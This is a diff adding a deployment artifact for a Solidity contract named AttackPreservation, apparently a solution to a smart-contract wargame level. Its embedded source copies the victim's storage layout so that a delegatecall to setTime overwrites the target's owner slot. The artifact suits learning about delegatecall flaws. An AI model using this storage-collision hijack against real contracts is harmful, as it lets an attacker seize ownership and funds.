@@ -1,0 +1,155 @@
+{
+  "address": "0x4bb176AF07b6f08eC20c22010B9e0B55F03a0D8e",
+  "abi": [
+    {
+      "inputs": [],
+      "name": "owner",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "uint256",
+          "name": "_time",
+          "type": "uint256"
+        }
+      ],
+      "name": "setTime",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "timeZone1Library",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "timeZone2Library",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x2c24921c36344d0238e724d77199701b74f18d9e9befe9b37a90ef96baf3b807",
+  "receipt": {
+    "to": null,
+    "from": "0x482577148a64CF20f4a62F14A2455dC0A79478c7",
+    "contractAddress": "0x4bb176AF07b6f08eC20c22010B9e0B55F03a0D8e",
+    "transactionIndex": 4,
+    "gasUsed": "114361",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000002000000000000000000000000000000000000000000000000000800000000000000000040100000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000400000000000000000000000000200000000000000000000000000000000000000000000000000040000100004000000000000000000001000000000000000000000000000000100000000000000000000000000000000000000000000000000000002000000000000000100000",
+    "blockHash": "0x7c9667243ad305bc476f9d0c7fe082b52c7369d413ce2731c5e6a27dff8d4a16",
+    "transactionHash": "0x2c24921c36344d0238e724d77199701b74f18d9e9befe9b37a90ef96baf3b807",
+    "logs": [
+      {
+        "transactionIndex": 4,
+        "blockNumber": 41322109,
+        "transactionHash": "0x2c24921c36344d0238e724d77199701b74f18d9e9befe9b37a90ef96baf3b807",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0x4dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000482577148a64cf20f4a62f14a2455dc0a79478c7",
+          "0x000000000000000000000000c275dc8be39f50d12f66b6a63629c39da5bae5bd"
+        ],
+        "data": "0x000000000000000000000000000000000000000000000000000daffef175e523000000000000000000000000000000000000000000000000117d63bf86d29805000000000000000000000000000000000000000000001344b9372818837874b6000000000000000000000000000000000000000000000000116fb3c0955cb2e2000000000000000000000000000000000000000000001344b944d81774ee59d9",
+        "logIndex": 5,
+        "blockHash": "0x7c9667243ad305bc476f9d0c7fe082b52c7369d413ce2731c5e6a27dff8d4a16"
+      }
+    ],
+    "blockNumber": 41322109,
+    "cumulativeGasUsed": "354709",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [],
+  "numDeployments": 1,
+  "solcInputHash": "5fc07a574682526aedfa6fa50111e072",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"timeZone1Library\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"timeZone2Library\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"author\":\"IbCaOs\",\"kind\":\"dev\",\"methods\":{},\"title\":\"AttackGateKeeperOne\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Preservation/AttackPreservation.sol\":\"AttackPreservation\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Preservation/AttackPreservation.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\n/// @title AttackGateKeeperOne\\n/// @author IbCaOs\\ncontract AttackPreservation {\\n\\n    address constant target = 0xA5DB1DfEC68DF8d5fBDd46f02755108ecb7249d6;\\n    // Same variables than Preservation contract. We need to maintain same context with storage variable\\n    address public timeZone1Library;\\n    address public timeZone2Library;\\n    address public owner; \\n    uint storedTime;\\n\\n    function setTime(uint _time) public {\\n        owner = address(uint160(_time));\\n    }\\n}\\n\",\"keccak256\":\"0x7dca104a2669281eb8770c54f9a786e4354c59320da8778431165cf7f5ce59b0\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5061011a806100206000396000f3fe6080604052348015600f57600080fd5b506004361060465760003560e01c806327d6974f14604b5780633beb26c41460795780633dc794221460a85780638da5cb5b1460ba575b600080fd5b600154605d906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60a6608436600460cc565b600280546001600160a01b0319166001600160a01b0392909216919091179055565b005b600054605d906001600160a01b031681565b600254605d906001600160a01b031681565b60006020828403121560dd57600080fd5b503591905056fea264697066735822122053915335698591e8583737ed690ba57e6e7afc2bfbded13d1ff15a8e7b1e528b64736f6c63430008120033",
+  "deployedBytecode": "0x6080604052348015600f57600080fd5b506004361060465760003560e01c806327d6974f14604b5780633beb26c41460795780633dc794221460a85780638da5cb5b1460ba575b600080fd5b600154605d906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60a6608436600460cc565b600280546001600160a01b0319166001600160a01b0392909216919091179055565b005b600054605d906001600160a01b031681565b600254605d906001600160a01b031681565b60006020828403121560dd57600080fd5b503591905056fea264697066735822122053915335698591e8583737ed690ba57e6e7afc2bfbded13d1ff15a8e7b1e528b64736f6c63430008120033",
+  "devdoc": {
+    "author": "IbCaOs",
+    "kind": "dev",
+    "methods": {},
+    "title": "AttackGateKeeperOne",
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 7,
+        "contract": "contracts/Preservation/AttackPreservation.sol:AttackPreservation",
+        "label": "timeZone1Library",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address"
+      },
+      {
+        "astId": 9,
+        "contract": "contracts/Preservation/AttackPreservation.sol:AttackPreservation",
+        "label": "timeZone2Library",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_address"
+      },
+      {
+        "astId": 11,
+        "contract": "contracts/Preservation/AttackPreservation.sol:AttackPreservation",
+        "label": "owner",
+        "offset": 0,
+        "slot": "2",
+        "type": "t_address"
+      },
+      {
+        "astId": 13,
+        "contract": "contracts/Preservation/AttackPreservation.sol:AttackPreservation",
+        "label": "storedTime",
+        "offset": 0,
+        "slot": "3",
+        "type": "t_uint256"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      },
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
